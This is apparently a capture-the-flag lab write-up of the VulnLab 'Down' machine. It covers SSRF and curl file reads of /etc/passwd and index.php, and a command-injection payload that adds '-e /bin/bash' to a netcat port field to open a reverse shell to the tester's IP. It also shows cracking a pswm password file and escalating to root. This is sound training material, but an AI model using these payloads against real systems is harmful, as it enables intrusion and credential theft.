---
title: Down
date: 2026-01-05 15:09:56
categories: ["VulnLab"]
tags: ["Web", "SSRF","SSH", "php", "pswm"]
cover: \images\Down\down_vl.png
---

# TLDR
This is an easy lab from VulnLabs where you learn to test and exploit SSRF and curl, analyse vulnerable source code and abuse it to gain a reverse shell as root.

# Enumeration
```bash
(jon㉿kali)-[~/vulnLab/down]$ sudo nmap -p- -A down.vl
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 10:45 +08
Nmap scan report for down.vl (10.10.103.81)
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA)
|   256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Is it down or just me?
|_http-server-header: Apache/2.4.52 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   177.04 ms 10.8.0.1
2   177.49 ms down.vl (10.10.103.81)

Nmap done: 1 IP address (1 host up) scanned in 401.76 seconds
```
- Ports 22 and 80 are open on the target.

## SSH (22)
```bash
(jon㉿kali)-[~/vulnLab/down]$ ssh jon@down.vl
The authenticity of host 'down.vl (10.10.103.81)' can't be established.
ED25519 key fingerprint is SHA256:uq3+WwrPajXEUJC3CCuYMMLFTVM8CGYqMtGB9mI29wg.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'down.vl' (ED25519) to the list of known hosts.
jon@down.vl's password:
Permission denied, please try again.
jon@down.vl's password:

```
- SSH password authentication is enabled.

## HTTP (80)
![HTTP website](/images/Down/http.png)
- Port 80 is running a HTTP server.

### Dirsearch
```bash
(jon㉿kali)-[~/vulnLab/down]$ dirsearch -u http://down.vl:80
python3 ~/tools/dirsearch/dirsearch.py -u http://down.vl:80 -t 25 -e *
Extension list: php, asp, aspx, jsp, html, js, txt, xml | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/jon/vulnLab/down/reports/http_down.vl_80/_25-12-16_11-26-32.txt

Target: http://down.vl:80/

[11:26:32] Starting: 
[11:26:32] 403 -  272B  - .htaccess.save
[11:26:32] 403 -  272B  - .htaccess_bak1
[11:26:32] 403 -  272B  - .htaccess_orig
[11:26:32] 403 -  272B  - .htaccess_src
[11:26:32] 403 -  272B  - .htaccess_extra
[11:26:32] 403 -  272B  - .ht_wsr.txt
[11:26:32] 403 -  272B  - .htaccessBAK
[11:26:32] 403 -  272B  - .htaccess.sample
[11:26:32] 403 -  272B  - .htaccessOLD2
[11:26:32] 403 -  272B  - .html
[11:26:32] 403 -  272B  - .html/
[11:26:32] 403 -  272B  - .http-oauth
[11:26:32] 403 -  272B  - .htpasswd_test
[11:26:32] 403 -  272B  - .htpasswd
[11:26:32] 403 -  272B  - .php
[11:26:32] 301 -  307B  - /javascript/ --> http://down.vl/javascript
[11:26:32] 403 -  272B  - /server-status/
[11:26:32] 403 -  272B  - /server-status

Task Completed
```
- A `/javascript/` directory exists with a status code 301 (forbidden).

### Website Features
![Testing website behavior](/images/Down/test_website.png)
- Upon entering the target IP's address, the website is redirected to `index.php` and its source code is displayed.
- Whenever there's an opportunity to enter a URL in a website, it's good practive to test for Server-Side Request Forgery (SSRF) to check if we can get the server to reach us. Or if it can reach out to itself. From there, test if we can enumerate valuable information.

# Gaining a Foothold
## Testing for SSRF
```bash
(jon㉿kali)-[~/vulnLab/down]$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.8.7.230] from down.vl [10.10.103.81] 47050
GET / HTTP/1.1
Host: 10.8.7.230
User-Agent: curl/7.81.0
Accept: */*
```
- Set up a netcat listener on Kali Linux to test if the target server can reach us.
- Upon submitting my Kali Linux IP, I got a hit on netcat.
- The output shows that `curl` is used to make the HTTP request (The `User-Agent` field tells you what tool the target machine used to make the HTTP request.) This means the target site is using `curl` to reach user-specified URLs and checkf is they're alive.

```bash
(jon㉿kali)-[~/vulnLab/down]$ curl down.vl
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Is it down or just me?</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <header>
        <img src="./logo.png" alt="Logo">
        <h2>Is it down or just me?</h2>
    </header>

    <div class="container">
        <h1>Is that website down, or is it just you?</h1>
        <form id="urlForm" action="index.php" method="POST">
            <input type="url" id="url" name="url" placeholder="Please enter a URL." required><br>
            <button type="submit">Is it down?</button>
        </form>
    </div>
    <footer>© 2024 isitdownorjustme LLC</footer>
</body>
</html>
```
- This is further confirmed when I `curl` `down.vl` on Kali Linux. The same source code on the website is returned. This means we can test if `down.vl` can make requests to itself and perform deeper scans on it to have better vision of the target.

### SSRF on `deep.vl`
![SSRF on deep.vl](/images/Down/ssrf.png)
- Upon submitting `http://localhost:80` on the site, it says port 80 is up and the same source code is returned. We saw port 80 open in our earlier Nmap scan, meaing a valid/active URL will return the website's source code.

![whitelist protocols](/images/Down/whitelist.png)
- Knowing the website uses `curl` to reach the URLs, I tried to read files on the target server using the `file:///` protocol.
- However, there is a whitelist of protocols allowed in the website.

### Focusing on curl
We'll try to leverage the functionality of `curl` to run OS command injection on `down.vl` and read its files.
```bash
(jon㉿kali)-[~/vulnLab/down]$ curl down.vl file:///etc/passwd
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Is it down or just me?</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <header>
    <img src="./logo.png" alt="logo">
    <h2>Is it down or just me?</h2>
  </header>
  <div class="container">
    <h1>Is that website down, or is it just you?</h1>
    <form id="urlForm" action="index.php" method="POST">
      <input type="url" id="url" name="url" placeholder="Please enter a URL." required><br>
      <button type="submit">Is it down?</button>
    </form>
  </div>
  <footer>© 2024 isitdownorjustme LLC</footer>
</body>
</html>
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
```
- Using `curl`, we successfully got the contents of `/etc/passwd` of the target server, displayed below the site's source code.

> **How `curl` works**
Example: `curl {URL 1} {URL 2}`
> - `curl` accepts more than 2 arguments.
> - It makes an outbound GET request to all the supplied URLs to get any available data from there, and print it in your terminal / webpage (if your site uses `curl`)

![OS Command Injection in Burp](/images/Down/burp_1.png)
- Using my Kali Linux IP and reading `/etc/passwd`, I found an entry for an **aleks** user.
- Make sure to start a HTTP server on Kali Linux first to log any incoming HTTP requests. We'll use this to verify if the site makes outbound HTTP requests to the specified URLs.

## Reading `index.php`
Knowing we have file read permissions, I explored the code of `index.php` in burp.
![index.php source code](/images/Down/index_php.png)
- Specifying `file:///etc/var/www/index.php` in burp, it's source code is rendered in the output. There's some interesting php code below the html.
- Here's what the php code shows:
  - Target server is making a GET request to query a parameter called `expertmode` and check if its value is TCP. 
  - The `port` parameter takes the user-specified value in the `$port` variable.
  - Server uses **netcat** to check if the user-specified port is open on the user-specified URL. It uses the `$port` variable instead of the sanitized `$port_int` variable. This is likely a coding mistake.
  - The `escapeshellcmd()` function is used on the `$ip` and `$port` variables, whose values are inserted directly into the string inside this function. `escapeshellcmd()` is meant to escape special characters in a single command. Since `$ip` and `$port` are inserted into the string before sanitization, this poses a security risk. `escapeshellarg()` should be used on the 2 variables, since it escapes individual arguments. Thus, safely sanitizing the 2 variables before being parsed. 

```bash
(jon㉿kali)-[~/vulnLab/down]$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.119.166 - - [16/Dec/2025 13:31:26] "GET / HTTP/1.1" 200 -
10.10.119.166 - - [16/Dec/2025 13:39:37] "GET / HTTP/1.1" 200 -
10.10.119.166 - - [16/Dec/2025 13:40:41] "GET / HTTP/1.1" 200 -
10.10.119.166 - - [16/Dec/2025 13:41:46] "GET / HTTP/1.1" 200 -
```
- The outbound requests from the target site are logged in my HTTP server, confirming that it makes outbound HTTP requests to the user-specified URLs.

# PrivEsc via RCE
We'll abuse the `expertmode` parameter and the use of `$port` in the php code.
![expertmode=tcp webpage](/images/Down/new_page.png)
- Based on the php logic above, I modified the website URL to include `?expertmode=tcp` and was redirected to a new page.
- Since the site is running netcat, we can abuse this functionality by specifying the IP address and port number of our attack machine.

```bash
(jon@kali)-[~/vulnLab/vpn]$ nc -lnvp 1337
listening on [any] 1337 ...
```
- Set up a netcat listener on port 1337.

![netcat rce](/images/Down/netcat_rce.png)
![netcat rce captured in burp](/images/Down/netcat_rce_burp.png)
- I submmitted my Kali IP and netcat port in the website and captured it in Burp.

![Getting RCE](/images/Down/get_rce.png)
```bash
ip=10.8.7.230&port=1337+-e+/bin/bash
```
- In Burp repeater, I added `-e /bin/bash` to the request. This opened a reverse bash shell on the target server as the **www-data** user.

# Post-Exploitation
## Reading `pswm`
```bash
www-data@down:/home/aleks/.local/share/pswm$ ls -la
total 12
drwxr-xr-x 2 aleks aleks 4096 Dec 16 13:44 .
drwxr-xr-x 3 aleks aleks 4096 Dec 16 13:44 ..
-rw-r--r-- 1 aleks aleks  226 Dec 16 13:44 pswm
www-data@down:/home/aleks/.local/share/pswm$ cat pswm
e9La0WkiJ00dKv05D3hg7XMd+UlBBvL<REDACTED>
```
- Knowing there's an **aleks** user, I explored his files and found a `pswm` file. Pswm is a simple command-line password manager written in Python.

## Decrypting alek's password
<!-- ![Decrypting alek's password](/images/Down/decrypt_pswm.png) -->
```bash
(jon㉿kali)-[~/vulnLab/down]$ python3 -m venv ~/myenv

(jon㉿kali)-[~/vulnLab/down]$ source ~/myenv/bin/activate

(myenv) (jon㉿kali)-[~/vulnLab/down]$ pip install cryptocode prettytable
Collecting cryptocode
  Downloading cryptocode-0.1-py3-none-any.whl.metadata (2.9 kB)
Collecting prettytable
  Downloading prettytable-3.17.0-py3-none-any.whl.metadata (34 kB)
Collecting pycryptodome (from cryptocode)
  Downloading pycryptodome-3.23.0-cp37-cp37m-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.4 kB)
Collecting wcwidth (from prettytable)
  Downloading wcwidth-0.2.14-py2.py3-none-any.whl.metadata (15 kB)
  Downloading cryptocode-0.1-py3-none-any.whl (4.1 kB)
  Downloading prettytable-3.17.0-py3-none-any.whl (34 kB)
  Downloading pycryptodome-3.23.0-cp37-cp37m-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.3/2.3 MB 1.8 MB/s eta 0:00:01
  Downloading wcwidth-0.2.14-py2.py3-none-any.whl (37 kB)
Installing collected packages: wcwidth, pycryptodome, prettytable, cryptocode
Successfully installed cryptocode-0.1 prettytable-3.17.0 pycryptodome-3.23.0 wcwidth-0.2.14

(myenv) (jon㉿kali)-[~/vulnLab/down]
$ python decrypt-pwsm.py -f pwsm -w ../../wordlists/rockyou.txt
[+] Master Password: flower
[+] Decrypted Data:

+----------------+----------+-----------------------------+
| Alias          | Username | Password                    |
+----------------+----------+-----------------------------+
| pwsm           | aleks    | flower                      |
| aleks@down     | aleks    | 1uY3w<REDACTED>             |
+----------------+----------+-----------------------------+
```
- Using a python virtual environment, I downloaded the `cryptodome` and `prettytable` dependencies and cracked alek's password using [decrypt_pwsm.py](https://github.com/seriotonctf/pswm-decryptor).

## PrivEsc to aleks
```bash
(jon㉿kali)-[~/vulnLab/down]$ ssh aleks@down.vl
aleks@down.vl's password:
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-119-generic x86_64)
Last login: Sun Sep 15 09:14:52 2024 from 10.8.0.101
aleks@down:~$ whoami
aleks
aleks@down:~$ ls
aleks@down:~$ ls -la
total 32
drwxr-xr-x  5 aleks aleks 4096 Dec 16 13:44 .
drwxr-xr-x  3 root   root  4096 Sep 15 09:14 ..
lrwxrwxrwx  1 aleks aleks    9 Dec 16 13:44 .bash_history -> /dev/null
-rw-r--r--  1 aleks aleks  220 Sep 15 09:14 .bash_logout
-rw-r--r--  1 aleks aleks 3771 Sep 15 09:14 .bashrc
drwx------  2 aleks aleks 4096 Sep 15 09:14 .cache
drwxr-xr-x  3 aleks aleks 4096 Dec 16 13:44 .local
-rw-r--r--  1 aleks aleks  807 Sep 15 09:14 .profile
drwx------  2 aleks aleks 4096 Sep 15 09:14 .ssh
-rw-r--r--  1 aleks aleks    0 Dec 16 13:44 .sudo_as_admin_successful
aleks@down:~$ cat .sudo_as_admin_successful
aleks@down:~$
```
- With alek's plaintext password, SSH into `down.vl`. Nothing interesting for us to use.

## PrivEsc to Root
```bash
aleks@down:~$ id
uid=1000(aleks) gid=1000(aleks) groups=1000(aleks),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
aleks@down:~$ su root
root@down:/home/aleks# whoami
root
root@down:/home/aleks#
```
- Checking alek's group membership, he is in the sudo group and can run commands with sudo privileges. Switch to the root user to root the machine.

# References
1. [pwsm Github](https://github.com/Julynx/pswm.git)
2. [pwsm-decryptor Github](https://github.com/seriotonctf/pswm-decryptor)
3. [Tyler Ramsbey - Down - YouTube Detailed Walkthrough](https://www.youtube.com/watch?v=xefgjzk4s1w)